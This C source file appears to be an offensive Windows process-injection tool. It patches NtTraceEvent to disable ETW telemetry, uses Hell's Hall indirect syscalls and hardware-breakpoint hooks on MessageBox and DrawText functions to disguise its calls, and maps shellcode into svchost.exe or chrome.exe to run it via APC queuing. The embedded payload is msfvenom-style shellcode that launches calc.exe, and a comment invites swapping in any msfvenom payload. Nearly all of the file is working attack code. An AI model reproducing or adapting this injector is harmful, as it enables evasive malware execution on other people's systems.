#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <stdint.h>
#include <winuser.h>
#include "Sympho.h"
#include "HellsHall.h"


// Global Variable :
NTSTATUS STATUS;
#define ViewShare 1
HANDLE hSection = NULL;
HANDLE hThread = NULL;
BYTE* pBaseSection = NULL;
DWORD PID = NULL;
HANDLE hProcess = NULL;
HANDLE hMap = NULL;
PVOID localBase = NULL;
PVOID remoteBase = NULL;
SIZE_T viewSize = NULL;
HANDLE hSnapshot = NULL;

typedef enum ETWfunc {
	vETWEventWrite,
	vETWEventWriteFull
};
// End of Global Variable



// HardwareBP variable :
VOID SetFunctionArgument(IN PCONTEXT pThreadCtx, IN ULONG_PTR uValue, IN DWORD dwParmIndex);
CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

#define CONTINUE_EXECUTION(CTX) (CTX->EFlags |= (1 << 16))

#define SETPARM_1(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x1))
#define SETPARM_2(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x2))
#define SETPARM_3(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x3))
#define SETPARM_4(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x4))
#define SETPARM_5(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x5))
#define SETPARM_6(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x6))
#define SETPARM_7(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x7))
#define SETPARM_8(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x8))
#define SETPARM_9(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0x9))
#define SETPARM_A(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0xA))
#define SETPARM_B(CTX, VALUE)(SetFunctionArgument(CTX, VALUE, 0xB))

#ifdef _WIN64
#define RETURN_VALUE(CTX, VALUE)((ULONG_PTR)CTX->Rax = (ULONG_PTR)VALUE)
#elif _WIN32
#define RETURN_VALUE(CTX, VALUE)((ULONG_PTR)CTX->Eax = (ULONG_PTR)VALUE)
#endif // _WIN64


#pragma section(".text")
__declspec(allocate(".text")) const unsigned char ucRet[] = { 0xC3 };

// Called in the detour function to block the execution of the original hooked function
VOID BLOCK_REAL(IN PCONTEXT pThreadCtx) {
#ifdef _WIN64
	pThreadCtx->Rip = (ULONG_PTR)&ucRet;
#elif _WIN32
	pThreadCtx->Eip = (DWORD)&ucRet;
#endif // _WIN64
}

// End of Hardware BreakPoint variable

enum DRX {
	DR0,
	DR1,
	DR2,
	DR3
};

enum DRX Dr0 = DR0;
enum DRX Dr1 = DR1;
enum DRX Dr2 = DR2;

typedef struct _MyStruct
{
	SysFunc NtMapViewOfSection;
	SysFunc NtCreateSection;
	SysFunc NtCreateThreadEx;
	SysFunc NtQueueApcThread;
	SysFunc NtQuerySystemInformation;
	SysFunc RtlAllocateHeap;
	SysFunc NtOpenProcess;
	SysFunc NtProtectVirtualMemory;
	SysFunc NtSuspendThread;
	SysFunc NtGetContextThread;
	SysFunc NtSetContextThread;
	SysFunc NtResumeThread;
} MyStruct, * PMyStruct;

MyStruct S = { 0 };
PSYSTEM_PROCESS_INFORMATION sProcInfo = NULL;


BOOL Initialize() {

	RtlSecureZeroMemory(&S, sizeof(MyStruct));

	if (!InitilizeSysFunc("NtQuerySystemInformation")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtQuerySystemInformation);

	if (!InitilizeSysFunc("NtMapViewOfSection")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtMapViewOfSection);

	if (!InitilizeSysFunc("NtCreateSection")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtCreateSection);

	if (!InitilizeSysFunc("NtCreateThreadEx")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtCreateThreadEx);

	if (!InitilizeSysFunc("NtQueueApcThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtQueueApcThread);

	if (!InitilizeSysFunc("RtlAllocateHeap")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.RtlAllocateHeap);

	if (!InitilizeSysFunc("NtOpenProcess")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtOpenProcess);

	if (!InitilizeSysFunc("NtSuspendThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtSuspendThread);

	if (!InitilizeSysFunc("NtGetContextThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtGetContextThread);

	if (!InitilizeSysFunc("NtSetContextThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtSetContextThread);

	if (!InitilizeSysFunc("NtResumeThread")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtResumeThread);

	if (!InitilizeSysFunc("NtProtectVirtualMemory")) {
		printf("Issues while initializing function\n");
		return FALSE;
	}
	getSysFuncStruct(&S.NtProtectVirtualMemory);

	return TRUE;
}
#define RET_OPCODE 0xC3
#define MOVE_EAX_imm32_OPCODE 0xB8

BOOL RemoveETWEvent(HMODULE hModule) {
	DWORD dwOldProtection = 0;

	printf("[i] Shuting Down ETW provision\n");
	PBYTE pNtTraceEvent = (PBYTE)GetProcAddress(hModule, "NtTraceEvent");
	if (!pNtTraceEvent)
		return FALSE;

	for (int i = 0; i < 0x20; i++) {
		if (pNtTraceEvent[i] == MOVE_EAX_imm32_OPCODE) {
			pNtTraceEvent = &pNtTraceEvent[i + 1];
			break;
		}
		if (pNtTraceEvent[i] == RET_OPCODE || pNtTraceEvent[i] == 0x0F || pNtTraceEvent[i] == 0x05)
			return FALSE;
	}

	void* pvoidNtTraceEvent = (void*)pNtTraceEvent;
	UINT sizet = sizeof(DWORD);

	SYSCALL(S.NtProtectVirtualMemory);
	if (!VirtualProtect(pNtTraceEvent, sizet, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect failed with error %d\n", GetLastError());
		return FALSE;
	}

	*(PDWORD)pNtTraceEvent = 0x000000FF; // Patch

	// Reset perms
	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect failed with error %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE\n");
	return TRUE;
}


HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
	PSYSTEM_PROCESS_INFORMATION entry = sProcInfo;
	HANDLE hPID = NULL;
	NTSTATUS status;
	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	while (entry->NextEntryOffset) {
		if (entry->ImageName.Buffer &&
			wcscmp(entry->ImageName.Buffer, ProcessName) == 0) {

			int localPID = (int)(ULONG_PTR)entry->UniqueProcessId;
			CLIENT_ID clientId = {
				.UniqueProcess = (HANDLE)(ULONG_PTR)localPID,
				.UniqueThread = NULL
			};

			const ACCESS_MASK desired = PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION;

			SYSCALL(S.NtOpenProcess);
			status = HellHall(&hPID, desired, &objAttr, &clientId);


			if (status == STATUS_SUCCESS && hPID) {
				*PID = localPID;
				printf("[+] Opened \"%ls\" PID=%d, handle=%p\n",
					ProcessName, *PID, hPID);
				return hPID;
			}
		}

		entry = (PSYSTEM_PROCESS_INFORMATION)
			((BYTE*)entry + entry->NextEntryOffset);
	}
	getchar();
	return NULL;
}

BOOL SettingMap(HANDLE* outSection, BYTE* outRemoteBase, HANDLE hProcess) {

	printf("[i] MessageBoxA hooked successfuly\n");

	// Put your msfvenom shellcode here !
	uint8_t payload[] = {
		 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
	0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,
	0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
	0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,
	0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,
	0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,
	0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,
	0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
	0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
	0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,
	0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,
	0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
	0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,
	0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,
	0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
	0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,
	0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
	0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,
	0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00
	};

	SIZE_T sPayload = sizeof(payload);
	LARGE_INTEGER maxSize = { .HighPart = 0, .LowPart = sPayload };
	SYSCALL(S.NtCreateSection);
	if ((STATUS = HellHall(&hMap, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] Issue creating the section\n");
		return FALSE;
	}
	printf("[+] Section created\n");
	SYSCALL(S.NtMapViewOfSection);
	if ((STATUS = HellHall(hMap, GetCurrentProcess(), &localBase, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("NtMapViewOfSection failed with status: 0x%X\n", STATUS);
		return FALSE;
	}
	else {
		printf("[i] NtmapViewofsection mapped locally\n");
	}

	if (hMap != NULL) {
		*outSection = hMap;
	}
	else {
		printf("[-] Failed to create the map\n");
	}

	if (localBase == NULL) {
		printf("[!] Failed to map the view\n");
		return FALSE;
	}

	memcpy(localBase, payload, sizeof(payload));
	viewSize = sPayload;
	if ((STATUS = HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY)) != 0) {
		printf("[-] Issue while mapping view remotely. NTSTATUS: 0x%08X\n", STATUS);
		return FALSE;
	}
	else {
		printf("File Mapped succesfuly with remote process at 0x%p\n", remoteBase);
		outRemoteBase = &remoteBase;
	}
	Sleep(100);
	HellHall(hMap, hProcess, &remoteBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_WRITECOPY);
	printf("[+] Remote protection set ok\n");
	return TRUE;
}




/*
Set Hardware BP
*/

uint64_t SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, uint64_t NewBitValue) {
	uint64_t mask = (1UL << NmbrOfBitsToModify) - 1UL;
	uint64_t NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);

	return NewDr7Register;
}

BOOL SetHardwareBreakingPnt(IN PVOID pAddress, IN PVOID fnHookFunc, IN enum DRX Drx) {

	if (!pAddress || !fnHookFunc)
		return FALSE;

	// Get local thread context
	if (!GetThreadContext((HANDLE)-2, &ThreadCtx)) // -2 for local thread
		return FALSE;

	// Sets the value of the Dr0-3 registers 
	switch (Drx) {
	case DR0: {
		if (!ThreadCtx.Dr0)
			ThreadCtx.Dr0 = pAddress;
		break;
	}
	case DR1: {
		if (!ThreadCtx.Dr1)
			ThreadCtx.Dr1 = pAddress;
		break;
	}
	case DR2: {
		if (!ThreadCtx.Dr2)
			ThreadCtx.Dr2 = pAddress;
		break;
	}
	case DR3: {
		if (!ThreadCtx.Dr3)
			ThreadCtx.Dr3 = pAddress;
		break;
	}
	default:
		return FALSE;
	}

	// enabling Breakpoints
	// SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue);=
	ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, (Drx * 2), 1, 1);

	// Set the thread context
	if (!SetThreadContext((HANDLE)-2, &ThreadCtx))
		return FALSE;

	return TRUE;
}



BOOL RemoveHardwareBreakingPnt(IN enum DRX Drx) {

	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	if (!GetThreadContext((HANDLE)-2, &ThreadCtx))
		return FALSE;

	// Remove the address of the hooked function from the thread context
	switch (Drx) {
	case DR0: {
		ThreadCtx.Dr0 = 0x00;
		break;
	}
	case DR1: {
		ThreadCtx.Dr1 = 0x00;
		break;
	}
	case DR2: {
		ThreadCtx.Dr2 = 0x00;
		break;
	}
	case DR3: {
		ThreadCtx.Dr3 = 0x00;
		break;
	}
	default:
		return FALSE;
	}

	// Disabling the hardware breakpoint by setting the target G0-3 flag to zero 
	ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, (Drx * 2), 1, 0);

	if (!SetThreadContext((HANDLE)-2, &ThreadCtx))
		return FALSE;

	return TRUE;
}




// VEH Function
LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
		PVOID exceptionAddress = pExceptionInfo->ExceptionRecord->ExceptionAddress;
		PCONTEXT ctx = pExceptionInfo->ContextRecord;
		enum DRX triggered = -1;

		if (exceptionAddress == (PVOID)ctx->Dr0) triggered = DR0;
		else if (exceptionAddress == (PVOID)ctx->Dr1) triggered = DR1;
		else if (exceptionAddress == (PVOID)ctx->Dr2) triggered = DR2;
		else if (exceptionAddress == (PVOID)ctx->Dr3) triggered = DR3;

		if (triggered >= DR0 && triggered <= DR2) {

			RemoveHardwareBreakingPnt(triggered);

			switch (triggered) {
			case DR0:
				//-----------------------------
				// Mapping of section
				//-----------------------------
				// RCX = &hSection
				// RDX = &pBaseSection
				// R8  = hProcess
				ctx->Rcx = (ULONG_PTR)&hSection;
				ctx->Rdx = (ULONG_PTR)&pBaseSection;
				ctx->R8 = (ULONG_PTR)hProcess;
			
				if (!SettingMap(&hSection, &pBaseSection, hProcess))
					RETURN_VALUE(ctx, FALSE);
				else
					RETURN_VALUE(ctx, TRUE);
				break;

			case DR1:
				//-----------------------------
				// Queue APC on alertable thread
				//-----------------------------
				// RCX = PID
				// RDX = pBaseSection
				ctx->Rcx = (ULONG_PTR)PID;
				ctx->Rdx = (ULONG_PTR)pBaseSection;
				if (!QueueShellcodeAPC((DWORD)PID, pBaseSection))
					RETURN_VALUE(ctx, FALSE);
				else
					RETURN_VALUE(ctx, TRUE);
				break;

			case DR2:
				//-----------------------------
				// Manual injection via SleepEx APC
				//-----------------------------
				// RCX = hProcess
				// RDX = pBaseSection
				ctx->Rcx = (ULONG_PTR)hProcess;
				ctx->Rdx = (ULONG_PTR)pBaseSection;
				if (!InjectShellcodeAPCmanually(hProcess, pBaseSection))
					RETURN_VALUE(ctx, FALSE);
				else
					RETURN_VALUE(ctx, TRUE);
				break;
			}

			// Bypass Hooked function
			BLOCK_REAL(ctx);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}


volatile BOOL executed = FALSE;
BOOL* pExecuted;
VOID CALLBACK DummyAPCFunc(ULONG_PTR param) {
	pExecuted = (BOOL*)param;
	*pExecuted = TRUE;
}


BOOL QueueShellcodeAPC(DWORD dwPID, PVOID pRemoteShellcode) {

	printf("[i] MessageBoxW hooked successfuly\n");
	int i = 0;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPID);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Snapshot failed.\n");
		return FALSE;
	}

	THREADENTRY32 te32 = { 0 };
	te32.dwSize = sizeof(THREADENTRY32);

	if (!Thread32First(hSnapshot, &te32)) {
		CloseHandle(hSnapshot);
		return FALSE;
	}
	do {
		if (te32.th32OwnerProcessID == dwPID) {
			hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
			if (hThread) {
				// Trying the injection
				DWORD res = QueueUserAPC((PAPCFUNC)pRemoteShellcode, hThread, (ULONG_PTR)NULL);
				if (res != 0) {
					printf("[+] APC queued on thread %lu\n", te32.th32ThreadID);
					break;
				}

			}
		}
	} while (Thread32Next(hSnapshot, &te32));
	int x = 0;
	if (i == 0) {
		return FALSE;
	}
	do {
		Sleep(100);
		if (executed) {
			printf("[+] DummyAPCFunc executed successfully.\n");
			CloseHandle(hSnapshot);
			return TRUE;
		}
		else if (x == 9) {
			printf("[-] DummyAPCFunc was not executed.\n");
			return FALSE;
		}
		else {
			x++;
		}
	} while (x < 10);

	CloseHandle(hSnapshot);
	return TRUE;
}

void MySleepEx() {
	SleepEx(1000, TRUE);
}

void MySleepThread() {
	while (1) {
		SleepEx(INFINITE, TRUE); // alertable sleep
	}
}

BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
	HANDLE hLocalTread = NULL;
	ULONG PreviousSuspendCount;
	printf("Before LOCAL APC injection\n");
	SYSCALL(S.NtCreateThreadEx);
	if ((STATUS = (HellHall(&hLocalTread, THREAD_ALL_ACCESS, 0, (HANDLE)-1, MySleepThread, 0, 0x00000001, 0, 0, 0, 0))) != 0) {
		printf("[-] failed to create local thread\n");
	}

	BOOL res = QueueUserAPC((PAPCFUNC)localBase, hLocalTread, (ULONG_PTR)NULL);
	if (res != 0) {
		printf("[+] APC queued on newly created thread id : %d\n", GetThreadId(hLocalTread));
	}
	else {
		printf("Error\n");
		return(FALSE);
	}

	SYSCALL(S.NtResumeThread);
	if ((STATUS = (HellHall(hLocalTread, &PreviousSuspendCount))) != 0) {
		printf("Error while resuming newly thread\n");
		return(FALSE);
	}




	return TRUE;
}



int main() {
	uint64_t expectedHash = 0x9B90848C8B008677; // NTDLL.DLL
	HMODULE hModule = GiveMeMyModule(expectedHash);

	if (!RemoveETWEvent(hModule)) {
		printf("[-] Error while patching ETW functions\n");
		exit(0);
	}

	AddVectoredExceptionHandler(1, VectorHandler);


	if (!hModule) {
		printf("Error Getting NTDLL\n");
		return -1;
	}
	else {
		printf("[+] found NTDLL\n");
	}

	if (!Initialize()) {
		printf("bad Initialization\n");
		return -1;
	}

	// Remove ETW 


	ULONG sProcInfoL = 0;

	/*
	Set Hardware BP
	*/
	if (!SetHardwareBreakingPnt(MessageBoxA, SettingMap, Dr0) || !SetHardwareBreakingPnt(MessageBoxW, QueueShellcodeAPC, Dr1) || !SetHardwareBreakingPnt(DrawTextA, InjectShellcodeAPCmanually, Dr2)) {
		printf("Error while Initializing HardwareBP\n");
		exit(-1);
	}


	// Get system information (process list)
	SYSCALL(S.NtQuerySystemInformation);
	if ((STATUS = HellHall(SystemProcessInformation, NULL, 0, &sProcInfoL)) != 0x0 && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
		printf("[!] NtQuerySystemInformation failed with status : 0x%0.8X\n", STATUS);
		return -1;
	}

	if (STATUS == STATUS_INFO_LENGTH_MISMATCH) {
		sProcInfoL *= 2;
	}

	// Allocate memory for process information
	sProcInfo = (PSYSTEM_PROCESS_INFORMATION)malloc(sProcInfoL);
	if (!sProcInfo) {
		printf("[!] Memory allocation failed\n");
		return -1;
	}

	// Query system info again
	if ((STATUS = HellHall(SystemProcessInformation, sProcInfo, sProcInfoL, NULL)) != 0x0) {
		printf("[!] NtQuerySystemInformation failed with status : 0x%0.8X\n", STATUS);
		free(sProcInfo);
		return -1;
	}

	// Try to open svchost.exe first
	hProcess = GiveMeMyProcessHandle(L"svchost.exe", &PID);
	if (hProcess == NULL) {
		// If not found, try to open chrome.exe
		printf("[!] No openable chrome.exe found. Trying chrome.exe...\n");
		hProcess = GiveMeMyProcessHandle(L"chrome.exe", &PID);
	}

	if (hProcess == NULL) {
		printf("[!] No openable svchost.exe or chrome.exe process found.\n");
		free(sProcInfo);
		return -1;
	}

	MessageBoxA(NULL, "Thanks !", "HIHI", MB_OK);
	if (pBaseSection != NULL && pBaseSection != 0) {
		printf("[+] Setup of the map successful at 0x%p\n", pBaseSection);
	}
	else {
		printf("Failed to create map\n");
	}
	printf("Getchar DR0\n");
	// Getting a thread from the remote process
	printf("[i] Press Enter to execute the shellcode\n");
	if (!MessageBoxW(NULL, L"test", "Never exec", MB_OK)) { // QueueShellcodeAPC((DWORD)PID, pBaseSection)
		printf("[i] Trying to inject a thread manually\n");
		printf("Getchar DR1\n");
		RECT rc = { 10, 10, 200, 50 };
		HDC hdc = NULL;
		if (!DrawTextA(hdc, "Hello World", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE)) { // !InjectShellcodeAPCmanually(hProcess, pBaseSection)
			printf("Failed to inject local thread manually\n");
		}
		else {
			printf("Enjoy :)\n");
			printf("Getchar DR2: %d\n", GetLastError());
			getchar();
		}
	}
	else {
		printf("Enjoy :)\n");
	}


}
